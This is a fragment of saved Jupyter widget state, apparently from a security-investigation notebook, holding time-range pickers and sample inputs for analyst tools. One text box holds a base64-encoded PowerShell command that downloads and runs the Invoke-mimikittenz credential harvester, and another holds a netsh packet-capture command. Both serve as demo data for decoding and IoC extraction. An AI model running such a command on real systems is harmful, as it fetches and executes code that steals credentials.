     "4668c8ca115342c585ae90c8d1458323": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "HBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_dfdb867f4b464317af9f5081fa13a1bf",
        "IPY_MODEL_92b70b6e43a24782bb09c30367b59fd2"
       ],
       "layout": "IPY_MODEL_f391bc2b5f1045db81d092b3dca97fee"
      }
     },
     "491e602079734ff888489bf3538502a2": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "4addadc2a53b41ea977d8590d5295a5a": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Query start time (UTC):",
       "layout": "IPY_MODEL_6c575a80b1e04b0e8a026c9f09396daa",
       "style": "IPY_MODEL_1782404880e3454ca2fa2fd848e419bd",
       "value": "2022-10-26 15:37:14.351231"
      }
     },
     "4e2ec238783f480bb03195ffbe169b15": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "50%"
      }
     },
     "54eae868eac145eeaa8553a221dc9d98": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "5ac2e326d31c484888a816ccca4b1333": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Query end time (UTC) :  ",
       "layout": "IPY_MODEL_f927e658ead64e81a7cb506458b9e4af",
       "style": "IPY_MODEL_65557d9010a6467bb929511465877ed9",
       "value": "2022-10-27 15:37:14.642408+00:00"
      }
     },
     "5be5a2a8db5e4562a0b28a6b93d499dd": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Time (24hr)",
       "layout": "IPY_MODEL_1029057be0b24185a7e6d289dcbe51f5",
       "style": "IPY_MODEL_ed0b4e1f49924f97845f0693a1b99cca",
       "value": "14:55:06.538642"
      }
     },
     "5ebea146cf9a473a9ab3769209e1d9e5": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "5f94d48b4d8b4ffca22bffe7ce372f1d": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "border": "solid gray 1px",
       "margin": "1pt",
       "padding": "5pt",
       "width": "90%"
      }
     },
     "6284bc4ac27442ac87d5d79d910bbd69": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Query start time (UTC):",
       "layout": "IPY_MODEL_e4dbbccd17964e6589ab84a8af5f173a",
       "style": "IPY_MODEL_5ebea146cf9a473a9ab3769209e1d9e5",
       "value": "2022-10-26 14:55:06.538642"
      }
     },
     "62c23d6111f84760917e15ee96497ebd": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "50%"
      }
     },
     "638c4e2fc261435d809e7bc1e8c8f472": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "644f0c75ca82494cb286191e71c72c83": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "650a1d920c634369a39ef4b7b12fb8be": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "65557d9010a6467bb929511465877ed9": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "65b78788fe584f969ec7e75b1fb8f9a6": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "HBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_7e0670d85886480291374ba5b5ab815a",
        "IPY_MODEL_d9d7916290674c398b11cbdd3ae1ad9c"
       ],
       "layout": "IPY_MODEL_68bd3916483a4fdd9a19178fd44af7ee"
      }
     },
     "68bd3916483a4fdd9a19178fd44af7ee": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "68cac38e5ba24f01af76705f7c5480b1": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "6c575a80b1e04b0e8a026c9f09396daa": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "50%"
      }
     },
     "6d478178b55145c0b00b53794076c1ac": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "6df36046e78e441ab9e6ec74360554dd": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "HBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_ad5e785da7fc40488ad97f0cc617c5c2",
        "IPY_MODEL_a83447e7164f4227b0d6a55b438bbf10"
       ],
       "layout": "IPY_MODEL_2af9c55520d345a098e6b2de6516e0cf"
      }
     },
     "6ff9933ac1ea4573a2ee3fff0cfdb4e9": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "HTMLModel",
      "state": {
       "layout": "IPY_MODEL_a6b8074783384de9be9bd6ae8545e39e",
       "style": "IPY_MODEL_638c4e2fc261435d809e7bc1e8c8f472",
       "value": "<h4>Set time range for pivot functions.</h4>"
      }
     },
     "700fe71afe0044db8df0335db80ce296": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "706375e2be2244ba8a4e868c1804d42c": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "706ef3c146224ac6891e2ab3d5d135cd": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Query end time (UTC) :  ",
       "layout": "IPY_MODEL_fdbc746325f34499bcf450ee0a732093",
       "style": "IPY_MODEL_9a3905cda87b46eab4014d2ef6b27327",
       "value": "2022-10-28 14:55:06.538642"
      }
     },
     "7386a9c363ae47359c140d47b44e1987": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "70%"
      }
     },
     "73d4bee0227742aea65d7a2da5c4c4ee": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "VBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_bc8cb4c87d1d457bb0c6f808f5127446",
        "IPY_MODEL_6284bc4ac27442ac87d5d79d910bbd69",
        "IPY_MODEL_706ef3c146224ac6891e2ab3d5d135cd"
       ],
       "layout": "IPY_MODEL_ab19fb72c4bc4e99bb9e76c939b1c922"
      }
     },
     "7513f920cca940a2b45b725eca5af79b": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "HBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_ac9908c575da473a94048ed1e229a1f3",
        "IPY_MODEL_5be5a2a8db5e4562a0b28a6b93d499dd"
       ],
       "layout": "IPY_MODEL_b2d3652fbf9f42d5b49e815245295229"
      }
     },
     "7517d4541bb8458287eb4f6a65760414": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "height": "150px",
       "width": "300px"
      }
     },
     "77055bdd8d744f7398e73203740b8d6e": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Query start time (UTC):",
       "layout": "IPY_MODEL_872af83b23fe4ad796f5b94c9c49756b",
       "style": "IPY_MODEL_491e602079734ff888489bf3538502a2",
       "value": "2022-10-26 14:34:59.583383+00:00"
      }
     },
     "781110104a9a48b9bb7db13b9b94a3c5": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "7bf1c5e9c7184bd0b09d8eb5a4d2aae7": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "7ca4c9a21b0445a489f866c1352c0704": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Time (24hr)",
       "layout": "IPY_MODEL_2a7627bb6e5444aa98529379cbda7afc",
       "style": "IPY_MODEL_e9207e9c067148dcbc68bdb8e5af7cbc",
       "value": "15:37:14.351231"
      }
     },
     "7cd58c5fd7f045dd91eb9326210196c8": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "7d516693e798457c99dd24295c7f9d9d": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "99%"
      }
     },
     "7e0670d85886480291374ba5b5ab815a": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "IntRangeSliderModel",
      "state": {
       "_model_name": "IntRangeSliderModel",
       "_view_name": "IntRangeSliderView",
       "description": "Time Range",
       "layout": "IPY_MODEL_0ebd16d168d74cbeb750bdc09c6163b3",
       "max": 28,
       "min": -28,
       "style": "IPY_MODEL_ace2faa637b543efb1a02f469c00d9f5",
       "value": [
        -1,
        1
       ]
      }
     },
     "81edab3d977d46b5835677018adedce2": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "LabelModel",
      "state": {
       "layout": "IPY_MODEL_05d3d49f32d7430bbdc49da4a1a3ff96",
       "style": "IPY_MODEL_8fe5f1b8dcb7429c830411bee8cfed14"
      }
     },
     "82949ff0955746378c492b65f3a40f75": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "82ca5746c0314105994198bf21837f39": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "83189ab1ac8f409b9f4515c86c533900": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "83e842dbf50645ffb3f0f11b73e143ec": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "83f0559c3f884b479757b292bee3339c": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "85c65c154c61458588ca06f0eaef6a4b": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "50%"
      }
     },
     "872af83b23fe4ad796f5b94c9c49756b": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "50%"
      }
     },
     "8c9c61e6fe084e95adf792a2da26f409": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "95%"
      }
     },
     "8e01ee34a789449ba21033e746d6f751": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "8f5689bf8a6b402488b6364244a82adf": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "8f751a2dd30047cabf3caa1affee5969": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "8fe5f1b8dcb7429c830411bee8cfed14": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "92b70b6e43a24782bb09c30367b59fd2": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Time (24hr)",
       "layout": "IPY_MODEL_b71a27828b1744c6971b484e79466d53",
       "style": "IPY_MODEL_14bbd6888da241079747ad3ab13c5a08",
       "value": "14:34:59.583383"
      }
     },
     "93ef5e76ae1c4c60bf0e2af57413524d": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "70%"
      }
     },
     "988ffb45f5614f9ab755ab722f40db21": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "9a3905cda87b46eab4014d2ef6b27327": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "9a81a9335c484d878b45b5916c2a7b19": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "9be20afe9d9647cd9d72bc05e54d29a2": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "VBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_3a3c5910a32149bca154c446994800cc",
        "IPY_MODEL_e634cd129ddf49028a04bebcf28087ce",
        "IPY_MODEL_b08886d0356543a99402f67c8de8276c"
       ],
       "layout": "IPY_MODEL_2d772e1ace594b6e82c384762ac092bb"
      }
     },
     "a19bc9419ff94593ba8f64c5509a6bc6": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "95%"
      }
     },
     "a2bf52d688044c8d98abd60d1b4d3f8d": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DropdownModel",
      "state": {
       "_options_labels": [
        "Second",
        "Minute",
        "Hour",
        "Day",
        "Week"
       ],
       "index": 3,
       "layout": "IPY_MODEL_cd29c851d21f47eebd997cd0aa9402ee",
       "style": "IPY_MODEL_644f0c75ca82494cb286191e71c72c83"
      }
     },
     "a2e580721a1545e0aba80a63e4ae1e41": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "a67a69d5529b45509dffa99cd54d6753": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "95%"
      }
     },
     "a6b8074783384de9be9bd6ae8545e39e": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "a78b0cf58105424da479fce96b57db64": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "HBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_c7c7db00d0c2488aa410a7390ebb87af",
        "IPY_MODEL_22a3661f0a0d41f984c5119e6b6ab953"
       ],
       "layout": "IPY_MODEL_d1c6d7e1d931462695fceb6d00e260d3"
      }
     },
     "a83447e7164f4227b0d6a55b438bbf10": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DropdownModel",
      "state": {
       "_options_labels": [
        "Second",
        "Minute",
        "Hour",
        "Day",
        "Week"
       ],
       "index": 3,
       "layout": "IPY_MODEL_e916c03fdc2649e4ba93b9c60b3bd337",
       "style": "IPY_MODEL_706375e2be2244ba8a4e868c1804d42c"
      }
     },
     "aac9e49d45fa45c4ab84b3e39021f3fd": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "height": "150px",
       "width": "300px"
      }
     },
     "ab19fb72c4bc4e99bb9e76c939b1c922": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "ab3e6f23158a451f983f1368217b2197": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "VBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_fa505a7c675646968b58db8bf288c2e2",
        "IPY_MODEL_7513f920cca940a2b45b725eca5af79b",
        "IPY_MODEL_73d4bee0227742aea65d7a2da5c4c4ee"
       ],
       "layout": "IPY_MODEL_b34f71011962443ca341aa5391271dd7"
      }
     },
     "abee5bd548014cfe8cf8f9755c7a05fe": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "70%"
      }
     },
     "ac9908c575da473a94048ed1e229a1f3": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DatePickerModel",
      "state": {
       "description": "Origin Date",
       "disabled": false,
       "layout": "IPY_MODEL_09e81fe91ba34d5d88e54c3662620a10",
       "style": "IPY_MODEL_20201e7053f64f45bce6597a641f60e6",
       "value": {
        "date": 27,
        "month": 9,
        "year": 2022
       }
      }
     },
     "ace2faa637b543efb1a02f469c00d9f5": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "SliderStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "ad5e785da7fc40488ad97f0cc617c5c2": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "IntRangeSliderModel",
      "state": {
       "_model_name": "IntRangeSliderModel",
       "_view_name": "IntRangeSliderView",
       "description": "Time Range",
       "layout": "IPY_MODEL_7386a9c363ae47359c140d47b44e1987",
       "max": 28,
       "min": -28,
       "style": "IPY_MODEL_2ed4451689b7499884e98ec53bd138cb",
       "value": [
        -1,
        0
       ]
      }
     },
     "af69f5f0823f4e01b11968bbdd360d2d": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "100px"
      }
     },
     "b06a888f953f4cb5a34ca4154a761e23": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "b0871aaaddc34657b04e1b944e6eda2f": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "VBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_6df36046e78e441ab9e6ec74360554dd",
        "IPY_MODEL_77055bdd8d744f7398e73203740b8d6e",
        "IPY_MODEL_b2da852a860f49e5892e26d9d454f243"
       ],
       "layout": "IPY_MODEL_16fad27b209349c894903d5adf28a9a8"
      }
     },
     "b08886d0356543a99402f67c8de8276c": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "VBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_65b78788fe584f969ec7e75b1fb8f9a6",
        "IPY_MODEL_4addadc2a53b41ea977d8590d5295a5a",
        "IPY_MODEL_ffaa3370e6d1480a97c276045e78f017"
       ],
       "layout": "IPY_MODEL_700fe71afe0044db8df0335db80ce296"
      }
     },
     "b17de6a0ab1b48e89fdaddc84ac129da": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "50%"
      }
     },
     "b2d3652fbf9f42d5b49e815245295229": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "b2da852a860f49e5892e26d9d454f243": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Query end time (UTC) :  ",
       "layout": "IPY_MODEL_85c65c154c61458588ca06f0eaef6a4b",
       "style": "IPY_MODEL_db7c73c904d141e88d24afe734193c8d",
       "value": "2022-10-27 14:34:59.583383+00:00"
      }
     },
     "b34f71011962443ca341aa5391271dd7": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "b41458679b9b4b6185badeaed08b0803": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "70%"
      }
     },
     "b71a27828b1744c6971b484e79466d53": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "b81d8cab36a4414286985c1c3313b0b5": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "HTMLModel",
      "state": {
       "layout": "IPY_MODEL_1dff0f8bc2b34f5499ca6d0f99e0164b",
       "style": "IPY_MODEL_988ffb45f5614f9ab755ab722f40db21",
       "value": "<h4>Set time range for pivot functions.</h4>"
      }
     },
     "b9098ca9813940c2af00ce6c14c0812d": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "border": "solid gray 1px",
       "margin": "1pt",
       "padding": "5pt",
       "width": "90%"
      }
     },
     "b97cb3c5231a4dda9069e162cddff3c3": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "IntRangeSliderModel",
      "state": {
       "_model_name": "IntRangeSliderModel",
       "_view_name": "IntRangeSliderView",
       "description": "Time Range",
       "layout": "IPY_MODEL_ba0cc1111a924904aa85adcd009081db",
       "max": 28,
       "min": -28,
       "style": "IPY_MODEL_c4a0c6c9dbc1485cb14f97a7a2fe6ad6",
       "value": [
        -1,
        0
       ]
      }
     },
     "ba04a5ffdc40450a9603b8040a5de0fb": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "ba0cc1111a924904aa85adcd009081db": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "70%"
      }
     },
     "bb2e3ed3a6bc443680468a738325cef4": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "VBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_fb1f218239af49f6a7522336d25733d9",
        "IPY_MODEL_a78b0cf58105424da479fce96b57db64",
        "IPY_MODEL_0aeb2229773c4a35989db1ca4f720e7c"
       ],
       "layout": "IPY_MODEL_2469a84752064aec8d6884cdf0db8c71"
      }
     },
     "bc8cb4c87d1d457bb0c6f808f5127446": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "HBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_f46bb6405df645d0bfbe1df6d29fbcec",
        "IPY_MODEL_034a5b93af564bf6bf2af1ab35ad8531"
       ],
       "layout": "IPY_MODEL_04657d3011fb4e0eae8d91df4fac028a"
      }
     },
     "c370dc8ee1154d7b852fe56c0d1e8dd4": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "c4a0c6c9dbc1485cb14f97a7a2fe6ad6": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "SliderStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "c5db7ecb884545729f32fc23a94cffb2": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "99%"
      }
     },
     "c75c34744f064cc484c3e77367b48b91": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Enter a commandline to extract IoCs",
       "layout": "IPY_MODEL_10a928ca3b97430f95c25c7e1e43da76",
       "style": "IPY_MODEL_2ee3ffcb4c15499a8b3eba39b3941ad7",
       "value": "netsh  start capture=yes IPv4.Address=1.2.3.4 tracefile=C:\\\\Users\\\\user\\\\AppData\\\\Local\\\\Temp\\\\bzzzzzz.txt"
      }
     },
     "c7c7db00d0c2488aa410a7390ebb87af": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DatePickerModel",
      "state": {
       "description": "Origin Date",
       "disabled": false,
       "layout": "IPY_MODEL_25df5ac0dcbc4d6aa23aca408f9d4914",
       "style": "IPY_MODEL_c99a4394d6774a18a456bb894dd46b08",
       "value": {
        "date": 27,
        "month": 9,
        "year": 2022
       }
      }
     },
     "c99a4394d6774a18a456bb894dd46b08": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "c9efa4094763494fb1f88798da70539a": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "95%"
      }
     },
     "cd0e9b91b76e4aa6931da0ad89620a11": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DropdownModel",
      "state": {
       "_options_labels": [
        "Second",
        "Minute",
        "Hour",
        "Day",
        "Week"
       ],
       "index": 3,
       "layout": "IPY_MODEL_003d1e6b3c2d47d7b57f58cf38998504",
       "style": "IPY_MODEL_a2e580721a1545e0aba80a63e4ae1e41"
      }
     },
     "cd29c851d21f47eebd997cd0aa9402ee": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "100px"
      }
     },
     "cd50151307ff4f31be93c5a778e9e222": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "SliderStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "cf98b25d5ffc4daab387eb925c4ff002": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DatePickerModel",
      "state": {
       "description": "Origin Date",
       "disabled": false,
       "layout": "IPY_MODEL_8f751a2dd30047cabf3caa1affee5969",
       "style": "IPY_MODEL_7bf1c5e9c7184bd0b09d8eb5a4d2aae7",
       "value": {
        "date": 27,
        "month": 9,
        "year": 2022
       }
      }
     },
     "d14dfc04926a4b8690871a09bb9d4ce3": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "d1c6d7e1d931462695fceb6d00e260d3": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "d9d7916290674c398b11cbdd3ae1ad9c": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DropdownModel",
      "state": {
       "_options_labels": [
        "Second",
        "Minute",
        "Hour",
        "Day",
        "Week"
       ],
       "index": 3,
       "layout": "IPY_MODEL_af69f5f0823f4e01b11968bbdd360d2d",
       "style": "IPY_MODEL_54eae868eac145eeaa8553a221dc9d98"
      }
     },
     "da1eb5fadfb14e198c86de67b5a56163": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Enter a commandline with powershell base64 encoded",
       "layout": "IPY_MODEL_4e2ec238783f480bb03195ffbe169b15",
       "style": "IPY_MODEL_8f5689bf8a6b402488b6364244a82adf",
       "value": "powershell -enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcHV0dGVycGFuZGEvbWltaWtpdHRlbnovbWFzdGVyL0ludm9rZS1taW1pa2l0dGVuei5wczEnKTsgSW52b2tlLW1pbWlraXR0ZW56Cg=="
      }
     },
     "db7c73c904d141e88d24afe734193c8d": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "dd4ea59adb744577b5982932c50053d5": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "de8c44289b904e6bb8c52e5268ed3e2a": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "deb1dadae9b84755ba35816d2ccb2eb2": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "border": "solid gray 1px",
       "margin": "1pt",
       "padding": "5pt",
       "width": "90%"
      }
     },
     "df27833b710d4f46a31d57caec4b682e": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "HBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_cf98b25d5ffc4daab387eb925c4ff002",
        "IPY_MODEL_27ed1061326d4449ae5d8f238d2ec4e0"
       ],
       "layout": "IPY_MODEL_68cac38e5ba24f01af76705f7c5480b1"
      }
     },
